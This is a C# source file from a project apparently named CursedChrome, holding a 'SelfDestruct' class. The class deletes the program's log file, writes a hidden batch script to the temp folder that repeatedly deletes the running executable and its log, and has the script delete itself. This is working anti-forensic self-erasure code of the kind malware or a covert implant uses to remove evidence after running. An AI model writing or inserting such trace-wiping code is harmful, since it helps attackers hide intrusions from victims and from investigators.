using System;
using System.Diagnostics;
using System.IO;
using System.Windows.Forms;
using CursedChrome.Core;

namespace CursedChrome.Utils
{
    public static class SelfDestruct
    {
        public static void Execute()
        {
            try
            {
                Logger.Log("Initiating cleanup");
                
                // Delete log file
                Logger.DeleteLogFile();
                
                // Create self-delete batch script
                string batchPath = CreateSelfDeleteBatch();
                
                // Execute the batch script
                ExecuteSelfDeleteBatch(batchPath);
                
                // Exit immediately
                Environment.Exit(0);
            }
            catch (Exception ex)
            {
                Logger.LogError("Cleanup failed", ex);
                Environment.Exit(0);
            }
        }
        
        private static string CreateSelfDeleteBatch()
        {
            string batchPath = Path.Combine(
                Path.GetTempPath(),
                "cleanup_" + Guid.NewGuid().ToString("N").Substring(0, 8) + ".bat"
            );
            
            string exePath = Application.ExecutablePath;
            string logPath = Configuration.LOG_FILE_PATH;
            
            string batchContent = $@"@echo off
:WAIT
timeout /t 2 /nobreak >nul 2>&1
del /f /q ""{exePath}"" 2>nul
if exist ""{exePath}"" goto WAIT
del /f /q ""{logPath}"" 2>nul
del /f /q ""%~f0"" 2>nul
";
            
            File.WriteAllText(batchPath, batchContent);
            Logger.Log($"Created cleanup script: {batchPath}");
            
            return batchPath;
        }
        
        private static void ExecuteSelfDeleteBatch(string batchPath)
        {
            ProcessStartInfo psi = new ProcessStartInfo
            {
                FileName = batchPath,
                CreateNoWindow = true,
                UseShellExecute = false,
                WindowStyle = ProcessWindowStyle.Hidden
            };
            
            Process.Start(psi);
            Logger.Log("Cleanup script executed");
        }
    }
}
